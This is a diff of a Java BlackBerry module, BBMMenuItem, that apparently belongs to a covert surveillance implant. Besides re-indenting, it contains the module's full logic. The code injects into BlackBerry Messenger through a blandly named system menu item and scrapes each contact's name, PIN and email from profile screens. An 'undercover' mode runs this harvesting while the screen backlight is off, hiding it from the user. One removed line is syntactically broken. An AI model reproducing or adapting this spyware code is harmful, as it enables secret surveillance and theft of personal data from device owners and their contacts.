@@ -6,269 +6,257 @@ import java.util.Vector;
 
 import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
 import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
-import net.rim.device.api.lbs.MapField;
-import net.rim.device.api.system.Application;
 import net.rim.device.api.system.Backlight;
-import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.system.EventLogger;
-import net.rim.device.api.ui.Field;
-import net.rim.device.api.ui.Keypad;
-import net.rim.device.api.ui.Manager;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
-import net.rim.device.api.ui.accessibility.AccessibleContext;
-import net.rim.device.api.ui.component.BitmapField;
-import net.rim.device.api.ui.component.ButtonField;
-import net.rim.device.api.ui.component.CheckboxField;
-import net.rim.device.api.ui.component.ChoiceField;
-import net.rim.device.api.ui.component.DateField;
-import net.rim.device.api.ui.component.GaugeField;
-import net.rim.device.api.ui.component.LabelField;
-import net.rim.device.api.ui.component.NullField;
-import net.rim.device.api.ui.component.ObjectListField;
-import net.rim.device.api.ui.component.RadioButtonField;
-import net.rim.device.api.ui.component.SeparatorField;
-import net.rim.device.api.ui.component.SpinBoxField;
-import net.rim.device.api.ui.component.TextField;
-import net.rim.device.api.ui.component.TreeField;
-import net.rim.device.api.util.Arrays;
 
 public class BBMMenuItem extends ApplicationMenuItem {
-	private static final String BBM_MENU = "Yield";
 
-	private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
 
-	private static BBMMenuItem instance;
+    private static BBMMenuItem instance;
 
-	UiApplication bbmApplication;
-	Screen contactsScreen;
-	// Vector conversationScreens = new Vector();
+    UiApplication bbmApplication;
+    Screen contactsScreen;
+    // Vector conversationScreens = new Vector();
 
-	Hashtable users = new Hashtable();
-	Hashtable userConversations = new Hashtable();
+    Hashtable users = new Hashtable();
+    Hashtable userConversations = new Hashtable();
 
-	boolean bbmInjected = false;
+    boolean bbmInjected = false;
 
-	// int numContacts;
-	// int numEmails;
+    // int numContacts;
+    // int numEmails;
 
-	static BBMMenuItem getInstance() {
-		if (instance == null)
-			instance = new BBMMenuItem(20);
+    static BBMMenuItem getInstance() {
+        if (instance == null)
+            instance = new BBMMenuItem(0);
 
-		return instance;
-	}
+        return instance;
+    }
 
-	public BBMMenuItem(int arg0) {
-		super(arg0);
+    public BBMMenuItem(int arg0) {
+        super(arg0);
 
-		undercover = !Backlight.isEnabled();
-		lookForConversationsThread();
+        undercover = !Backlight.isEnabled();
+        lookForConversationsThread();
 
-	}
+    }
 
-	Vector contacts = new Vector();
-	Thread t = null;
-	boolean undercover = false;
-	ConversationScreen conversationScreen;
+    Vector contacts = new Vector();
+    Thread t = null;
+    boolean undercover = false;
+    ConversationScreen conversationScreen;
 
-	public void lookForConversationsThread() {
+    public void lookForConversationsThread() {
 
-		if (t != null) {
-			return;
-		}
-		conversationScreen = new ConversationScreen();
-		t = new Thread(conversationScreen);
+        if (t != null) {
+            return;
+        }
+        conversationScreen = new ConversationScreen();
+        t = new Thread(conversationScreen);
 
-		t.start();
+        t.start();
 
-	}
+    }
 
-	public Object run(Object context) {
-		try {
-			debug.info("BBMMenuItem context: " + context);
-			UiApplication app = UiApplication.getUiApplication();
-			Class cl = app.getClass();
+    public Object run(Object context) {
+        try {
+            debug.info("BBMMenuItem context: " + context);
+            UiApplication app = UiApplication.getUiApplication();
+            Class cl = app.getClass();
 
-			debug.trace("class: " + cl);
+            debug.trace("class: " + cl);
 
-			Screen screen = UiApplication.getUiApplication().getActiveScreen();
+            Screen screen = UiApplication.getUiApplication().getActiveScreen();
 
-			debug.trace("screen: " + screen + " count: "
-					+ screen.getUiEngine().getScreenCount());
+            debug.trace("screen: " + screen + " count: "
+                    + screen.getUiEngine().getScreenCount());
 
-			debug.startBuffering(EventLogger.INFORMATION);
-			if (screen.getClass().getName().indexOf("BBMContactsScreen") > 0) {
-				contacts.removeAllElements();
+            debug.startBuffering(EventLogger.INFORMATION);
+            if (screen.getClass().getName().indexOf("BBMContactsScreen") > 0) {
+                contacts.removeAllElements();
 
-				contactsScreen = screen;
-				bbmApplication = UiApplication.getUiApplication();
+                contactsScreen = screen;
+                bbmInjected = true;
 
-				FieldExplorer explorer = new FieldExplorer();
-				contacts = explorer.explore(screen);
+                bbmApplication = UiApplication.getUiApplication();
+                // lookForConversationsThread();
+                conversationScreen.setBBM(bbmApplication);
 
-				screen.close();
-				bbmInjected = true;
+                FieldExplorer explorer = new FieldExplorer();
+                contacts = explorer.explore(screen);
 
-				// lookForConversationsThread();
-				conversationScreen.setBBM(bbmApplication);
+                screen.close();
 
-				//#ifdef DEBUG
-				debug.info("BBM INJECTED!");
-				debug.(Debug.COLOR_GREEN);
-				//#endif
-			} else {
-			    //#ifdef DEBUG
-				debug.warn("BBM NOT INJECTED!");
-				debug.led(Debug.COLOR_RED);
-				//#endif
-			}
+                //#ifdef DEBUG
+                debug.info("BBM INJECTED!");
+                //debug.(Debug.COLOR_GREEN);
+                //#endif
+            } else {
+                //#ifdef DEBUG
+                debug.warn("BBM NOT INJECTED!");
+                debug.led(Debug.COLOR_RED);
+                //#endif
+            }
 
-			debug.stopBuffering();
+            debug.stopBuffering();
 
-		} catch (Exception ex) {
-		  //#ifdef DEBUG
-			debug.warn("injectBBM:" + ex.toString());
-			debug.led(Debug.COLOR_RED);
-			//#endif
-		}
-		return null;
-	}
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.warn("injectBBM:" + ex.toString());
+            debug.led(Debug.COLOR_RED);
+            //#endif
+        }
+        return null;
+    }
 
-	private synchronized boolean extractProfile(Screen screen) {
-		debug.trace("extractProfile");
-		debug.trace("  local active screen: "
-				+ UiApplication.getUiApplication().getActiveScreen());
+    private synchronized boolean extractProfile(Screen screen) {
+        debug.trace("extractProfile");
+        debug.trace("  local active screen: "
+                + UiApplication.getUiApplication().getActiveScreen());
 
-		try {
-			if (MenuWalker.walk("View Contact Profile", screen, true)
-					|| MenuWalker.walk("Contact Profile", screen, true)) {
-				Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
+        try {
+            if (MenuWalker.walk("View Contact Profile", screen, true)
+                    || MenuWalker.walk("Contact Profile", screen, true)) {
+                Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
 
-				debug.info("wolked in Contact Profile");
-				Utils.sleep(100);
-				Screen newScreen = UiApplication.getUiApplication()
-						.getActiveScreen();
+                debug.info("wolked in Contact Profile");
+                Utils.sleep(100);
+                Screen newScreen = UiApplication.getUiApplication()
+                        .getActiveScreen();
 
-				if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
-					debug.trace("no Contact Profile: " + newScreen);
-					return false;
-				}
-				// Ocio che gli schermi aperti vengono agganciati a
-				// UiApplication!
-				// debug.trace("  active screen: " + newScreen);
-				// debug.trace("  local active screen: "
-				// + UiApplication.getUiApplication().getActiveScreen());
+                if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
+                    debug.trace("no Contact Profile: " + newScreen);
+                    return false;
+                }
+                // Ocio che gli schermi aperti vengono agganciati a
+                // UiApplication!
+                // debug.trace("  active screen: " + newScreen);
+                // debug.trace("  local active screen: "
+                // + UiApplication.getUiApplication().getActiveScreen());
 
-				debug.trace("exploring Contact Profile: " + newScreen);
+                debug.trace("exploring Contact Profile: " + newScreen);
 
-				FieldExplorer explorer = new FieldExplorer();
-				Vector textfields = explorer.explore(newScreen);
+                FieldExplorer explorer = new FieldExplorer();
+                Vector textfields = explorer.explore(newScreen);
 
-				if (textfields.size() == 2 || textfields.size() == 3) {
-					String user = (String) textfields.elementAt(0);
-					String pin = (String) textfields.elementAt(1);
-					String email = "";
-					
-					debug.info("User: " + user);
-					debug.info("PIN: " + pin);
-					
-					if(textfields.size() == 3){
-						email = (String) textfields.elementAt(2);
-						debug.info("Email: " + email);
-					}
-					
-					users.put(user.toLowerCase(), new User(user,pin,email));
+                if (textfields.size() == 2 || textfields.size() == 3) {
+                    String user = (String) textfields.elementAt(0);
+                    String pin = (String) textfields.elementAt(1);
+                    String email = "";
 
-					//#ifdef DEBUG
-					debug.led(Debug.COLOR_ORANGE);
-					//#endif
-				}
+                    debug.info("User: " + user);
+                    debug.info("PIN: " + pin);
 
-				debug.trace("closing Contact Profile");
-				newScreen.close();
-			} else {
-				debug.info("");
-			}
+                    if (textfields.size() == 3) {
+                        email = (String) textfields.elementAt(2);
+                        debug.info("Email: " + email);
+                    }
 
-		} catch (Exception ex) {
-			debug.stopBuffering();
-			debug.error(ex.toString());
-			return false;
-		}
-		return true;
-	}
+                    users.put(user.toLowerCase(), new User(user, pin, email));
 
-	public String toString() {
-		return BBM_MENU;
-	}
+                    //#ifdef DEBUG
+                    debug.led(Debug.COLOR_ORANGE);
+                    //#endif
+                }
 
-	Thread ucThread;
+                debug.trace("closing Contact Profile");
+                newScreen.close();
+            } else {
+                debug.info("");
+            }
 
-	public void underCoverJobs() {
+        } catch (Exception ex) {
+            debug.stopBuffering();
+            debug.error(ex.toString());
+            return false;
+        }
+        return true;
+    }
 
-		debug.info("Under cover");
-		undercover = true;
+    public String toString() {
+        return BBM_MENU;
+    }
 
-		if (ucThread != null) {
-			return;
-		}
+    Thread ucThread;
 
-		if (!bbmInjected) {
-			return;
-		}
+    public void underCoverJobs() {
 
-		ucThread = new Thread(new Runnable() {
+        debug.info("Under cover");
+        undercover = true;
 
-			public void run() {
+        if (ucThread != null) {
+            return;
+        }
 
-				for (int i = 0; i < conversationScreen.size(); i++) {
-					final Screen screen = conversationScreen.elementAt(i);
+        if (!bbmInjected) {
+            return;
+        }
 
-					bbmApplication.invokeLater(new Runnable() {
+        ucThread = new Thread(new Runnable() {
 
-						public void run() {
-							debug.trace("run, extracting profile from: "
-									+ screen);
-							extractProfile(screen);
-						}
+            public void run() {
 
-					});
-					
-					Utils.sleep(500);
+                for (int i = 0; i < conversationScreen.size(); i++) {
+                    final Screen screen = conversationScreen.elementAt(i);
 
-				}
-			}
+                    bbmApplication.invokeLater(new Runnable() {
 
-		});
+                        public void run() {
+                            debug.trace("run, extracting profile from: "
+                                    + screen);
+                            extractProfile(screen);
+                        }
 
-		ucThread.start();
+                    });
 
-	}
+                    Utils.sleep(500);
 
-	public void stopUnderCoverJobs() {
-		debug.info("Stop Under cover");
-		undercover = false;
+                }
+            }
 
-		// if (ucThread != null) {
-		// ucThread.interrupt();
-		// }
+        });
 
-		ucThread = null;
+        ucThread.start();
 
-	}
+    }
 
-	public void addMenuBBM() {
-		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
-		// long bbmid = 4470559380030396000L; Non funziona
-		// long bbmid = 5028374280894129973L; Non funziona
-		// long bbmid = 7084794250801777300L;
-		ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
-	}
+    public void stopUnderCoverJobs() {
+        debug.info("Stop Under cover");
+        undercover = false;
 
-	public void removeMenuBBM() {
-		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
-		ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
-	}
+        // if (ucThread != null) {
+        // ucThread.interrupt();
+        // }
+
+        ucThread = null;
+
+    }
+
+    public void addMenuBBM() {
+        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
+        // long bbmid = 4470559380030396000L; Non funziona
+        // long bbmid = 5028374280894129973L; Non funziona
+        // long bbmid = 7084794250801777300L;
+        ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
+    }
+
+    public void removeMenuBBM() {
+        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
+        ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
+    }
+
+    private static final String BBM_MENU = "Abort";
+
+    public static char getKey() {
+        return 'a';
+    }
+
+    public boolean isInjected() {
+        debug.info("injected: " + bbmInjected);
+        return bbmInjected;
+    }
 
 }
